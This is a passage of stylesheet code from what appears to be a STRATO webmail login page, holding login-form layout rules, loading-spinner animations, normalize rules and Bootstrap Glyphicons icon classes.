        #box-form-body .checkbox.custom,
        #box-form-body .radio.custom {
            padding-left: 1.25rem
        }

        #box-form-body .checkbox.custom input:checked+i.toggle,
        #box-form-body .radio.custom input:checked+i.toggle {
            background-color: transparent;
            border: 1px solid #ccc;
            padding: 2px;
            font: normal normal normal 10px/1 FontAwesome
        }

        #login-title {
            text-align: left;
            font-size: 18px;
            font-weight: 700;
            margin: 0
        }

        #io-ox-login-help,
        #io-ox-login-feedback,
        #io-ox-login-feedback div {
            text-align: left;
            font-size: 13px
        }

        #io-ox-login-feedback.alert-highlight>.alert-info {
            background: #eee;
            border-radius: 4px;
            padding: 8px;
            font-weight: 700
        }

        .row.password-retype {
            display: none
        }

        .login-type-message #box-form-body {
            min-height: unset !important
        }

        .login-type-message #box-form-body form>div>div.row {
            margin: 0 !important
        }

        .login-type-message #box-form-body #io-ox-login-help {
            margin: 0
        }

        @media (max-width:767px) {
            #io-ox-login-teaser {
                display: none
            }

            #io-ox-login-content>.align-center {
                flex-grow: 1
            }
        }

        @media (max-height:300px) {
            #io-ox-language-list {
                max-height: 100px
            }
        }

        @media (max-height:600px) {
            #io-ox-language-list {
                max-height: 200px
            }
        }

        @media (min-height:600px) {
            #io-ox-language-list {
                max-height: 500px
            }
        }

        .smartphone #io-ox-login-screen #io-ox-login-container .login-spacer,
        .smartphone #io-ox-login-screen #io-ox-login-container #box-form-header,
        .smartphone #io-ox-login-screen #io-ox-login-container .username label,
        .smartphone #io-ox-login-screen #io-ox-login-container .password label,
        .smartphone #io-ox-login-screen #io-ox-login-container .password-retype label,
        .smartphone #io-ox-login-screen #io-ox-login-container .email label,
        .smartphone #io-ox-login-screen #io-ox-login-container #io-ox-information-message {
            display: none
        }

        .smartphone #io-ox-login-screen #io-ox-login-container .login-logo {
            margin: 16px;
            max-height: 24px
        }

        .smartphone #io-ox-login-screen #io-ox-login-container #login-title-mobile {
            margin-right: 16px;
            align-self: center;
            font-size: 18px;
            font-weight: 700;
            text-align: right;
            flex-grow: 1;
            color: #fff
        }

        .smartphone #io-ox-login-screen #io-ox-login-container #io-ox-login-content #box-form {
            width: 320px
        }

        .smartphone #io-ox-login-screen #io-ox-login-container #io-ox-login-content #box-form #box-form-body {
            border-radius: 6px;
            min-height: unset
        }

        .smartphone #io-ox-login-screen #io-ox-login-container #io-ox-login-content #box-form #box-form-body #io-ox-login-feedback {
            transition: transform .3s ease-out;
            transform: scaleY(1)
        }

        .smartphone #io-ox-login-screen #io-ox-login-container #io-ox-login-content #box-form #box-form-body #io-ox-login-feedback:empty {
            transform: scaleY(0)
        }

        .smartphone #io-ox-login-screen #io-ox-login-container #io-ox-login-footer {
            margin-top: 0;
            justify-content: center
        }

        .smartphone #io-ox-login-screen #io-ox-login-container #io-ox-login-footer #io-ox-languages {
            margin: 0
        }

        .smartphone #io-ox-login-screen #io-ox-login-container #io-ox-login-footer #io-ox-languages .lang-label {
            margin-bottom: 0
        }

        @-moz-keyframes fa-spin {
            0% {
                -moz-transform: rotate(0deg)
            }

            100% {
                -moz-transform: rotate(359deg)
            }
        }

        @-webkit-keyframes fa-spin {
            0% {
                -webkit-transform: rotate(0deg)
            }

            100% {
                -webkit-transform: rotate(359deg)
            }
        }

        @-o-keyframes fa-spin {
            0% {
                -o-transform: rotate(0deg)
            }

            100% {
                -o-transform: rotate(359deg)
            }
        }

        @-ms-keyframes fa-spin {
            0% {
                -ms-transform: rotate(0deg)
            }

            100% {
                -ms-transform: rotate(359deg)
            }
        }

        @keyframes fa-spin {
            0% {
                transform: rotate(0deg)
            }

            100% {
                transform: rotate(359deg)
            }
        }

        .form-control::-webkit-input-placeholder {
            color: #666
        }

        .form-control::-moz-placeholder {
            color: #666;
            opacity: 1
        }

        .form-control::-ms-input-placeholder {
            color: #666
        }
    </style>
    <style type="text/css">
        html,
        body {
            background-color: #fff;
            margin: 0;
            padding: 0;
            border: 0;
        }

        body {
            overflow: hidden;
        }

        #showstopper {
            position: relative;
            display: none;
            text-align: center;
            top: 50%;
            font-size: 16px;
        }

        #showstopper .reload {
            display: block;
            margin: 16px;
        }

        #showstopper .timeout,
        #showstopper .session,
        #showstopper .down {
            display: none;
        }

        .throbber {
            position: absolute;
            top: 50%;
            width: 100%;
            text-align: center;
            margin: -10px 0 -21px 0;
        }

        .throbber>div {
            width: 14px;
            height: 14px;
            background-color: #ccc;
            border-radius: 100%;
            display: inline-block;
            -webkit-animation: bouncedelay 1.4s infinite ease-in-out;
            animation: bouncedelay 1.4s infinite ease-in-out;
            -webkit-animation-fill-mode: both;
            animation-fill-mode: both;
        }

        .throbber .bounce1 {
            -webkit-animation-delay: -0.32s;
            animation-delay: -0.32s;
        }

        .throbber .bounce2 {
            -webkit-animation-delay: -0.16s;
            animation-delay: -0.16s;
        }

        @-webkit-keyframes bouncedelay {

            0%,
            80%,
            100% {
                -webkit-transform: scale(0);
            }

            40% {
                -webkit-transform: scale(1);
            }
        }

        @keyframes bouncedelay {

            0%,
            80%,
            100% {
                transform: scale(0);
                -webkit-transform: scale(0);
            }

            40% {
                transform: scale(1);
                -webkit-transform: scale(1);
            }
        }
    </style>
    <meta id="bootstrap" />
    <style type="text/css"
        data-require-src="https://webmail.strato.com/appsuite/v=7.10.5-33.20220405.070454/apps/themes/strato/common">
        html {
            font-family: sans-serif;
            -ms-text-size-adjust: 100%;
            -webkit-text-size-adjust: 100%;
        }

        body {
            margin: 0;
        }

        article,
        aside,
        details,
        figcaption,
        figure,
        footer,
        header,
        hgroup,
        main,
        menu,
        nav,
        section,
        summary {
            display: block;
        }

        audio,
        canvas,
        progress,
        video {
            display: inline-block;
            vertical-align: baseline;
        }

        audio:not([controls]) {
            display: none;
            height: 0;
        }

        [hidden],
        template {
            display: none;
        }

        a {
            background-color: transparent;
        }

        a:active,
        a:hover {
            outline: 0;
        }

        abbr[title] {
            border-bottom: none;
            text-decoration: underline;
            text-decoration: underline dotted;
        }

        b,
        strong {
            font-weight: bold;
        }

        dfn {
            font-style: italic;
        }

        h1 {
            font-size: 2em;
            margin: 0.67em 0;
        }

        mark {
            background: #ff0;
            color: #000;
        }

        small {
            font-size: 80%;
        }

        sub,
        sup {
            font-size: 75%;
            line-height: 0;
            position: relative;
            vertical-align: baseline;
        }

        sup {
            top: -0.5em;
        }

        sub {
            bottom: -0.25em;
        }

        img {
            border: 0;
        }

        svg:not(:root) {
            overflow: hidden;
        }

        figure {
            margin: 1em 40px;
        }

        hr {
            box-sizing: content-box;
            height: 0;
        }

        pre {
            overflow: auto;
        }

        code,
        kbd,
        pre,
        samp {
            font-family: monospace, monospace;
            font-size: 1em;
        }

        button,
        input,
        optgroup,
        select,
        textarea {
            color: inherit;
            font: inherit;
            margin: 0;
        }

        button {
            overflow: visible;
        }

        button,
        select {
            text-transform: none;
        }

        button,
        html input[type="button"],
        input[type="reset"],
        input[type="submit"] {
            -webkit-appearance: button;
            cursor: pointer;
        }

        button[disabled],
        html input[disabled] {
            cursor: default;
        }

        button::-moz-focus-inner,
        input::-moz-focus-inner {
            border: 0;
            padding: 0;
        }

        input {
            line-height: normal;
        }

        input[type="checkbox"],
        input[type="radio"] {
            box-sizing: border-box;
            padding: 0;
        }

        input[type="number"]::-webkit-inner-spin-button,
        input[type="number"]::-webkit-outer-spin-button {
            height: auto;
        }

        input[type="search"] {
            -webkit-appearance: textfield;
            box-sizing: content-box;
        }

        input[type="search"]::-webkit-search-cancel-button,
        input[type="search"]::-webkit-search-decoration {
            -webkit-appearance: none;
        }

        fieldset {
            border: 1px solid #c0c0c0;
            margin: 0 2px;
            padding: 0.35em 0.625em 0.75em;
        }

        legend {
            border: 0;
            padding: 0;
        }

        textarea {
            overflow: auto;
        }

        optgroup {
            font-weight: bold;
        }

        table {
            border-collapse: collapse;
            border-spacing: 0;
        }

        td,
        th {
            padding: 0;
        }

        @media print {

            *,
            *:before,
            *:after {
                color: #000 !important;
                text-shadow: none !important;
                background: transparent !important;
                box-shadow: none !important;
            }

            a,
            a:visited {
                text-decoration: underline;
            }

            a[href]:after {
                content: " (" attr(href) ")";
            }

            abbr[title]:after {
                content: " (" attr(title) ")";
            }

            a[href^="#"]:after,
            a[href^="javascript:"]:after {
                content: "";
            }

            pre,
            blockquote {
                border: 1px solid #999;
                page-break-inside: avoid;
            }

            thead {
                display: table-header-group;
            }

            tr,
            img {
                page-break-inside: avoid;
            }

            img {
                max-width: 100% !important;
            }

            p,
            h2,
            h3 {
                orphans: 3;
                widows: 3;
            }

            h2,
            h3 {
                page-break-after: avoid;
            }

            .navbar {
                display: none;
            }

            .btn>.caret,
            .dropup>.btn>.caret {
                border-top-color: #000 !important;
            }

            .label {
                border: 1px solid #000;
            }

            .table {
                border-collapse: collapse !important;
            }

            .table td,
            .table th {
                background-color: #fff !important;
            }

            .table-bordered th,
            .table-bordered td {
                border: 1px solid #ddd !important;
            }
        }

        @font-face {
            font-family: "Glyphicons Halflings";
            src: url("../fonts/glyphicons-halflings-regular.eot");
            src: url("../fonts/glyphicons-halflings-regular.eot?#iefix") format("embedded-opentype"), url("../fonts/glyphicons-halflings-regular.woff2") format("woff2"), url("../fonts/glyphicons-halflings-regular.woff") format("woff"), url("../fonts/glyphicons-halflings-regular.ttf") format("truetype"), url("../fonts/glyphicons-halflings-regular.svg#glyphicons_halflingsregular") format("svg");
        }

        .glyphicon {
            position: relative;
            top: 1px;
            display: inline-block;
            font-family: "Glyphicons Halflings";
            font-style: normal;
            font-weight: 400;
            line-height: 1;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        .glyphicon-asterisk:before {
            content: "\002a";
        }

        .glyphicon-plus:before {
            content: "\002b";
        }

        .glyphicon-euro:before,
        .glyphicon-eur:before {
            content: "\20ac";
        }

        .glyphicon-minus:before {
            content: "\2212";
        }

        .glyphicon-cloud:before {
            content: "\2601";
        }

        .glyphicon-envelope:before {
            content: "\2709";
        }

        .glyphicon-pencil:before {
            content: "\270f";
        }

        .glyphicon-glass:before {
            content: "\e001";
        }

        .glyphicon-music:before {
            content: "\e002";
        }

        .glyphicon-search:before {
            content: "\e003";
        }

        .glyphicon-heart:before {
            content: "\e005";
        }

        .glyphicon-star:before {
            content: "\e006";
        }

        .glyphicon-star-empty:before {
            content: "\e007";
        }

        .glyphicon-user:before {
            content: "\e008";
        }

        .glyphicon-film:before {
            content: "\e009";
        }

        .glyphicon-th-large:before {
            content: "\e010";
        }

        .glyphicon-th:before {
            content: "\e011";
        }

        .glyphicon-th-list:before {
            content: "\e012";
        }

        .glyphicon-ok:before {
            content: "\e013";
        }

        .glyphicon-remove:before {
            content: "\e014";
        }

        .glyphicon-zoom-in:before {
            content: "\e015";
        }

        .glyphicon-zoom-out:before {
            content: "\e016";
        }

        .glyphicon-off:before {
            content: "\e017";
        }

        .glyphicon-signal:before {
            content: "\e018";
        }

        .glyphicon-cog:before {
            content: "\e019";
        }

        .glyphicon-trash:before {
            content: "\e020";
        }

        .glyphicon-home:before {
            content: "\e021";
        }

        .glyphicon-file:before {
            content: "\e022";
        }

        .glyphicon-time:before {
            content: "\e023";
        }

        .glyphicon-road:before {
            content: "\e024";
        }

        .glyphicon-download-alt:before {
            content: "\e025";
        }

        .glyphicon-download:before {
            content: "\e026";
        }

        .glyphicon-upload:before {
            content: "\e027";
        }

        .glyphicon-inbox:before {
            content: "\e028";
        }

        .glyphicon-play-circle:before {
            content: "\e029";
        }

        .glyphicon-repeat:before {
            content: "\e030";
        }

        .glyphicon-refresh:before {
            content: "\e031";
        }

        .glyphicon-list-alt:before {
            content: "\e032";
        }

        .glyphicon-lock:before {
            content: "\e033";
        }

        .glyphicon-flag:before {
            content: "\e034";
        }

        .glyphicon-headphones:before {
            content: "\e035";
        }

        .glyphicon-volume-off:before {
            content: "\e036";
        }

        .glyphicon-volume-down:before {
            content: "\e037";
        }

        .glyphicon-volume-up:before {
            content: "\e038";
        }

        .glyphicon-qrcode:before {
            content: "\e039";
        }

        .glyphicon-barcode:before {
            content: "\e040";
        }

        .glyphicon-tag:before {
            content: "\e041";
        }

        .glyphicon-tags:before {
            content: "\e042";
        }

        .glyphicon-book:before {
            content: "\e043";
        }

        .glyphicon-bookmark:before {
            content: "\e044";
        }

        .glyphicon-print:before {
            content: "\e045";
        }

        .glyphicon-camera:before {
            content: "\e046";
        }

        .glyphicon-font:before {
            content: "\e047";
        }

        .glyphicon-bold:before {
            content: "\e048";
        }

        .glyphicon-italic:before {
            content: "\e049";
        }

        .glyphicon-text-height:before {
            content: "\e050";
        }

        .glyphicon-text-width:before {
            content: "\e051";
        }

        .glyphicon-align-left:before {
            content: "\e052";
        }

        .glyphicon-align-center:before {
            content: "\e053";
        }

        .glyphicon-align-right:before {
            content: "\e054";
        }

        .glyphicon-align-justify:before {
            content: "\e055";
        }

        .glyphicon-list:before {
            content: "\e056";
        }

        .glyphicon-indent-left:before {
            content: "\e057";
        }

        .glyphicon-indent-right:before {
            content: "\e058";
        }

        .glyphicon-facetime-video:before {
            content: "\e059";
        }

        .glyphicon-picture:before {
            content: "\e060";
        }

        .glyphicon-map-marker:before {
            content: "\e062";
        }

        .glyphicon-adjust:before {
            content: "\e063";
        }

        .glyphicon-tint:before {
            content: "\e064";
        }

        .glyphicon-edit:before {
            content: "\e065";
        }

        .glyphicon-share:before {
            content: "\e066";
        }

        .glyphicon-check:before {
            content: "\e067";
        }

        .glyphicon-move:before {
            content: "\e068";
        }

        .glyphicon-step-backward:before {
            content: "\e069";
        }

        .glyphicon-fast-backward:before {
            content: "\e070";
        }

        .glyphicon-backward:before {
            content: "\e071";
        }

        .glyphicon-play:before {
            content: "\e072";
        }

        .glyphicon-pause:before {
            content: "\e073";
        }

        .glyphicon-stop:before {
            content: "\e074";
        }

        .glyphicon-forward:before {
            content: "\e075";
        }

        .glyphicon-fast-forward:before {
            content: "\e076";
        }

        .glyphicon-step-forward:before {
            content: "\e077";
        }

        .glyphicon-eject:before {
            content: "\e078";
        }

        .glyphicon-chevron-left:before {
            content: "\e079";
        }

        .glyphicon-chevron-right:before {
            content: "\e080";
        }

        .glyphicon-plus-sign:before {
            content: "\e081";
        }

        .glyphicon-minus-sign:before {
            content: "\e082";
        }

        .glyphicon-remove-sign:before {
            content: "\e083";
        }

        .glyphicon-ok-sign:before {
            content: "\e084";
        }

        .glyphicon-question-sign:before {
            content: "\e085";
        }

        .glyphicon-info-sign:before {
            content: "\e086";
        }

        .glyphicon-screenshot:before {
            content: "\e087";
        }

        .glyphicon-remove-circle:before {
            content: "\e088";
        }

        .glyphicon-ok-circle:before {
            content: "\e089";
        }

        .glyphicon-ban-circle:before {
            content: "\e090";
        }

        .glyphicon-arrow-left:before {
            content: "\e091";
        }

        .glyphicon-arrow-right:before {
            content: "\e092";
        }

        .glyphicon-arrow-up:before {
            content: "\e093";
        }

        .glyphicon-arrow-down:before {
            content: "\e094";
        }

        .glyphicon-share-alt:before {
            content: "\e095";
        }

        .glyphicon-resize-full:before {
            content: "\e096";
        }

        .glyphicon-resize-small:before {
            content: "\e097";
        }

        .glyphicon-exclamation-sign:before {
            content: "\e101";
        }

        .glyphicon-gift:before {
            content: "\e102";
        }

        .glyphicon-leaf:before {
            content: "\e103";
        }

        .glyphicon-fire:before {
            content: "\e104";
        }

        .glyphicon-eye-open:before {
            content: "\e105";
        }

        .glyphicon-eye-close:before {
            content: "\e106";
        }

        .glyphicon-warning-sign:before {
            content: "\e107";
        }

        .glyphicon-plane:before {
            content: "\e108";
        }

        .glyphicon-calendar:before {
            content: "\e109";
        }

        .glyphicon-random:before {
            content: "\e110";
        }

        .glyphicon-comment:before {
            content: "\e111";
        }

        .glyphicon-magnet:before {
            content: "\e112";
        }

        .glyphicon-chevron-up:before {
            content: "\e113";
        }

        .glyphicon-chevron-down:before {
            content: "\e114";
        }

        .glyphicon-retweet:before {
            content: "\e115";
        }

        .glyphicon-shopping-cart:before {
            content: "\e116";
        }

        .glyphicon-folder-close:before {
            content: "\e117";
        }

        .glyphicon-folder-open:before {
            content: "\e118";
        }

        .glyphicon-resize-vertical:before {
            content: "\e119";
        }

        .glyphicon-resize-horizontal:before {
            content: "\e120";
        }

        .glyphicon-hdd:before {
            content: "\e121";
        }

        .glyphicon-bullhorn:before {
            content: "\e122";
        }

        .glyphicon-bell:before {
            content: "\e123";
        }

        .glyphicon-certificate:before {
            content: "\e124";
        }

        .glyphicon-thumbs-up:before {
            content: "\e125";
        }

        .glyphicon-thumbs-down:before {
            content: "\e126";
        }

        .glyphicon-hand-right:before {
            content: "\e127";
        }

        .glyphicon-hand-left:before {
            content: "\e128";
        }

        .glyphicon-hand-up:before {
            content: "\e129";
        }

        .glyphicon-hand-down:before {
            content: "\e130";
        }

        .glyphicon-circle-arrow-right:before {
            content: "\e131";
        }

        .glyphicon-circle-arrow-left:before {
            content: "\e132";
        }

        .glyphicon-circle-arrow-up:before {
            content: "\e133";
        }

        .glyphicon-circle-arrow-down:before {
            content: "\e134";
        }

        .glyphicon-globe:before {
            content: "\e135";
        }

        .glyphicon-wrench:before {
            content: "\e136";
        }

        .glyphicon-tasks:before {
            content: "\e137";
        }

        .glyphicon-filter:before {
            content: "\e138";
        }

        .glyphicon-briefcase:before {
            content: "\e139";
        }

        .glyphicon-fullscreen:before {
            content: "\e140";
        }

        .glyphicon-dashboard:before {
            content: "\e141";
        }

        .glyphicon-paperclip:before {
            content: "\e142";
        }

        .glyphicon-heart-empty:before {
            content: "\e143";
        }

        .glyphicon-link:before {
            content: "\e144";
        }

        .glyphicon-phone:before {
            content: "\e145";
        }

        .glyphicon-pushpin:before {
            content: "\e146";
        }

        .glyphicon-usd:before {
            content: "\e148";
        }

        .glyphicon-gbp:before {
            content: "\e149";
        }

        .glyphicon-sort:before {
            content: "\e150";
        }

        .glyphicon-sort-by-alphabet:before {
            content: "\e151";
        }

        .glyphicon-sort-by-alphabet-alt:before {
            content: "\e152";
        }

        .glyphicon-sort-by-order:before {
            content: "\e153";
        }

        .glyphicon-sort-by-order-alt:before {
            content: "\e154";
        }

        .glyphicon-sort-by-attributes:before {
            content: "\e155";
        }

        .glyphicon-sort-by-attributes-alt:before {
            content: "\e156";
        }

        .glyphicon-unchecked:before {
            content: "\e157";
        }

        .glyphicon-expand:before {
            content: "\e158";
        }

        .glyphicon-collapse-down:before {
            content: "\e159";
        }

        .glyphicon-collapse-up:before {
            content: "\e160";
        }

        .glyphicon-log-in:before {
            content: "\e161";
        }

        .glyphicon-flash:before {
            content: "\e162";
        }

        .glyphicon-log-out:before {
            content: "\e163";
        }

        .glyphicon-new-window:before {
            content: "\e164";
        }

        .glyphicon-record:before {
            content: "\e165";
        }

        .glyphicon-save:before {
            content: "\e166";
        }

        .glyphicon-open:before {
            content: "\e167";
        }

        .glyphicon-saved:before {
            content: "\e168";
        }

        .glyphicon-import:before {
            content: "\e169";
        }

        .glyphicon-export:before {
            content: "\e170";
        }

        .glyphicon-send:before {
            content: "\e171";
        }

        .glyphicon-floppy-disk:before {
            content: "\e172";
        }

        .glyphicon-floppy-saved:before {
            content: "\e173";
        }

        .glyphicon-floppy-remove:before {
            content: "\e174";
        }

        .glyphicon-floppy-save:before {
            content: "\e175";
        }

        .glyphicon-floppy-open:before {
            content: "\e176";
        }

        .glyphicon-credit-card:before {
            content: "\e177";
        }

        .glyphicon-transfer:before {
            content: "\e178";
        }

        .glyphicon-cutlery:before {
            content: "\e179";
        }

        .glyphicon-header:before {
            content: "\e180";
        }

        .glyphicon-compressed:before {
            content: "\e181";
        }

        .glyphicon-earphone:before {
            content: "\e182";
        }

        .glyphicon-phone-alt:before {
            content: "\e183";
        }

        .glyphicon-tower:before {
            content: "\e184";
        }

        .glyphicon-stats:before {
            content: "\e185";
        }

        .glyphicon-sd-video:before {
            content: "\e186";
        }

        .glyphicon-hd-video:before {
            content: "\e187";
        }

        .glyphicon-subtitles:before {
            content: "\e188";
        }

        .glyphicon-sound-stereo:before {
            content: "\e189";
        }

        .glyphicon-sound-dolby:before {
            content: "\e190";
        }

        .glyphicon-sound-5-1:before {
            content: "\e191";
        }

        .glyphicon-sound-6-1:before {
            content: "\e192";
        }

        .glyphicon-sound-7-1:before {
            content: "\e193";
        }

        .glyphicon-copyright-mark:before {
            content: "\e194";
        }

        .glyphicon-registration-mark:before {
            content: "\e195";
        }

        .glyphicon-cloud-download:before {
            content: "\e197";
        }

        .glyphicon-cloud-upload:before {
            content: "\e198";
        }

        .glyphicon-tree-conifer:before {
            content: "\e199";
        }

        .glyphicon-tree-deciduous:before {
            content: "\e200";
        }

        .glyphicon-cd:before {
            content: "\e201";
        }

        .glyphicon-save-file:before {
            content: "\e202";
        }

        .glyphicon-open-file:before {
            content: "\e203";
        }

        .glyphicon-level-up:before {
            content: "\e204";
        }

        .glyphicon-copy:before {
            content: "\e205";
        }

        .glyphicon-paste:before {
            content: "\e206";
        }

        .glyphicon-alert:before {
            content: "\e209";
        }

        .glyphicon-equalizer:before {
            content: "\e210";
        }

        .glyphicon-king:before {
            content: "\e211";
        }

        .glyphicon-queen:before {
            content: "\e212";
        }

        .glyphicon-pawn:before {
            content: "\e213";
        }

        .glyphicon-bishop:before {
            content: "\e214";
        }

        .glyphicon-knight:before {
            content: "\e215";
        }

        .glyphicon-baby-formula:before {
            content: "\e216";
        }

        .glyphicon-tent:before {
            content: "\26fa";
        }

        .glyphicon-blackboard:before {
            content: "\e218";
        }

        .glyphicon-bed:before {
            content: "\e219";
        }

        .glyphicon-apple:before {
            content: "\f8ff";
        }

        .glyphicon-erase:before {
            content: "\e221";
        }

        .glyphicon-hourglass:before {
            content: "\231b";
        }

        .glyphicon-lamp:before {
            content: "\e223";
        }

        .glyphicon-duplicate:before {
            content: "\e224";
        }

        .glyphicon-piggy-bank:before {
            content: "\e225";
        }

        .glyphicon-scissors:before {
            content: "\e226";
        }

        .glyphicon-bitcoin:before {
            content: "\e227";
        }

        .glyphicon-btc:before {
            content: "\e227";
        }

        .glyphicon-xbt:before {
            content: "\e227";
        }

        .glyphicon-yen:before {
            content: "\00a5";
        }

        .glyphicon-jpy:before {
            content: "\00a5";
        }

        .glyphicon-ruble:before {
            content: "\20bd";
        }

        .glyphicon-rub:before {
            content: "\20bd";
        }

        .glyphicon-scale:before {
            content: "\e230";
        }

        .glyphicon-ice-lolly:before {
            content: "\e231";
        }

        .glyphicon-ice-lolly-tasted:before {
            content: "\e232";
        }

        .glyphicon-education:before {
            content: "\e233";
        }

        .glyphicon-option-horizontal:before {
            content: "\e234";
        }

        .glyphicon-option-vertical:before {
            content: "\e235";
        }

        .glyphicon-menu-hamburger:before {
            content: "\e236";
        }

        .glyphicon-modal-window:before {
            content: "\e237";
        }

        .glyphicon-oil:before {
            content: "\e238";
        }

        .glyphicon-grain:before {
            content: "\e239";
        }

        .glyphicon-sunglasses:before {
            content: "\e240";
        }

        .glyphicon-text-size:before {
            content: "\e241";
        }

        .glyphicon-text-color:before {
            content: "\e242";
        }

        .glyphicon-text-background:before {
            content: "\e243";
        }

        .glyphicon-object-align-top:before {
            content: "\e244";
        }

        .glyphicon-object-align-bottom:before {
            content: "\e245";
        }

        .glyphicon-object-align-horizontal:before {
            content: "\e246";
        }

        .glyphicon-object-align-left:before {
            content: "\e247";
        }

        .glyphicon-object-align-vertical:before {
            content: "\e248";
        }

        .glyphicon-object-align-right:before {
            content: "\e249";
        }

        .glyphicon-triangle-right:before {
            content: "\e250";
        }

        .glyphicon-triangle-left:before {
            content: "\e251";
        }

        .glyphicon-triangle-bottom:before {
            content: "\e252";
        }

        .glyphicon-triangle-top:before {
            content: "\e253";
        }

        .glyphicon-console:before {
            content: "\e254";
        }

        .glyphicon-superscript:before {
            content: "\e255";
        }

        .glyphicon-subscript:before {
            content: "\e256";
        }

        .glyphicon-menu-left:before {
            content: "\e257";
        }

        .glyphicon-menu-right:before {
            content: "\e258";
        }

        .glyphicon-menu-down:before {
            content: "\e259";
        }

        .glyphicon-menu-up:before {
            content: "\e260";
        }

        * {
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box;
        }

        *:before,
        *:after {
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box;
        }

        html {
            font-size: 10px;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
            font-size: 14px;
            line-height: 1.42857143;
            color: #333;
            background-color: #fff;
        }

        input,
        button,
        select,
        textarea {
            font-family: inherit;
            font-size: inherit;
            line-height: inherit;
        }

        a {
            color: #07b;
            text-decoration: none;
        }

        a:hover,
        a:focus {
            color: #00466e;
            text-decoration: underline;
        }

        a:focus {
            outline: 5px auto -webkit-focus-ring-color;
            outline-offset: -2px;
        }

        figure {
            margin: 0;
        }

        img {
            vertical-align: middle;
        }

        .img-responsive,
        .thumbnail>img,
        .thumbnail a>img,
        .carousel-inner>.item>img,
        .carousel-inner>.item>a>img {
            display: block;
            max-width: 100%;
            height: auto;
        }

        .img-rounded {
            border-radius: 3px;
        }

        .img-thumbnail {
            padding: 4px;
            line-height: 1.42857143;
            background-color: #fff;
            border: 1px solid #ddd;
            border-radius: 3px;
            -webkit-transition: all 0.2s ease-in-out;
            -o-transition: all 0.2s ease-in-out;
            transition: all 0.2s ease-in-out;
            display: inline-block;
            max-width: 100%;
            height: auto;
        }

        .img-circle {
            border-radius: 50%;
        }

        hr {
            margin-top: 20px;
            margin-bottom: 20px;
            border: 0;
            border-top: 1px solid #eee;
        }

        .sr-only {
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            border: 0;
        }

        .sr-only-focusable:active,
        .sr-only-focusable:focus {
            position: static;
            width: auto;
            height: auto;
            margin: 0;
            overflow: visible;
            clip: auto;
        }

        [role="button"] {
            cursor: pointer;
        }

        h1,
        h2,
        h3,
        h4,
        h5,
        h6,
        .h1,
        .h2,
        .h3,
        .h4,
        .h5,
        .h6 {
            font-family: inherit;
            font-weight: 500;
            line-height: 1.1;
            color: inherit;
        }

        h1 small,
        h2 small,
        h3 small,
        h4 small,
        h5 small,
        h6 small,
        .h1 small,
        .h2 small,
        .h3 small,
        .h4 small,
        .h5 small,
        .h6 small,
        h1 .small,
        h2 .small,
        h3 .small,
        h4 .small,
        h5 .small,
        h6 .small,
        .h1 .small,
        .h2 .small,
        .h3 .small,
        .h4 .small,
        .h5 .small,
        .h6 .small {
            font-weight: 400;
            line-height: 1;
            color: #777;
        }

        h1,
        .h1,
        h2,
        .h2,
        h3,
        .h3 {
            margin-top: 20px;
            margin-bottom: 10px;
        }

        h1 small,
        .h1 small,
        h2 small,
        .h2 small,
        h3 small,
        .h3 small,
        h1 .small,
        .h1 .small,
        h2 .small,
        .h2 .small,
        h3 .small,
        .h3 .small {
            font-size: 65%;
        }

        h4,
        .h4,
        h5,
        .h5,
        h6,
        .h6 {
            margin-top: 10px;
            margin-bottom: 10px;
        }

        h4 small,
        .h4 small,
        h5 small,
        .h5 small,
        h6 small,
        .h6 small,
        h4 .small,
        .h4 .small,
        h5 .small,
        .h5 .small,
        h6 .small,
        .h6 .small {
            font-size: 75%;
        }

        h1,
        .h1 {
            font-size: 36px;
        }

        h2,
        .h2 {
            font-size: 30px;
        }

        h3,
        .h3 {
            font-size: 24px;
        }

        h4,
        .h4 {
            font-size: 18px;
        }

        h5,
        .h5 {
            font-size: 14px;
        }

        h6,
        .h6 {
            font-size: 12px;
        }

        p {
            margin: 0 0 10px;
        }

        .lead {
            margin-bottom: 20px;
            font-size: 16px;
            font-weight: 300;
            line-height: 1.4;
        }

        @media (min-width: 768px) {
            .lead {
                font-size: 21px;
            }
        }

        small,
        .small {
            font-size: 85%;
        }

        mark,
        .mark {
            padding: 0.2em;
            background-color: #fcf8e3;
        }

        .text-left {
            text-align: left;
        }

        .text-right {
            text-align: right;
        }

        .text-center {
            text-align: center;
        }

        .text-justify {
            text-align: justify;
        }

        .text-nowrap {
            white-space: nowrap;
        }

        .text-lowercase {
            text-transform: lowercase;
        }

        .text-uppercase {
            text-transform: uppercase;
        }

        .text-capitalize {
            text-transform: capitalize;
        }

        .text-muted {
            color: #777;
        }

        .text-primary {
            color: #f80;
        }

        a.text-primary:hover,
        a.text-primary:focus {
            color: #cc6d00;
        }

        .text-success {
            color: #3c763d;
        }

        a.text-success:hover,
        a.text-success:focus {
            color: #2b542c;
        }

        .text-info {
            color: #31708f;
        }

        a.text-info:hover,
        a.text-info:focus {
            color: #245269;
        }

        .text-warning {
            color: #8a6d3b;
        }

        a.text-warning:hover,
        a.text-warning:focus {
            color: #66512c;
        }

        .text-danger {
            color: #a94442;
        }

        a.text-danger:hover,
        a.text-danger:focus {
            color: #843534;
        }

        .bg-primary {
            color: #fff;
            background-color: #f80;
        }

        a.bg-primary:hover,
        a.bg-primary:focus {
            background-color: #cc6d00;
        }

        .bg-success {
            background-color: #dff0d8;
        }

        a.bg-success:hover,
        a.bg-success:focus {
            background-color: #c1e2b3;
        }

        .bg-info {
            background-color: #d9edf7;
        }

        a.bg-info:hover,
        a.bg-info:focus {
            background-color: #afd9ee;
        }

        .bg-warning {
            background-color: #fcf8e3;
        }

        a.bg-warning:hover,
        a.bg-warning:focus {
            background-color: #f7ecb5;
        }

        .bg-danger {
            background-color: #f2dede;
        }

        a.bg-danger:hover,
        a.bg-danger:focus {
            background-color: #e4b9b9;
        }

        .page-header {
            padding-bottom: 9px;
            margin: 40px 0 20px;
            border-bottom: 1px solid #eee;
        }

        ul,
        ol {
            margin-top: 0;
            margin-bottom: 10px;
        }

        ul ul,
        ol ul,
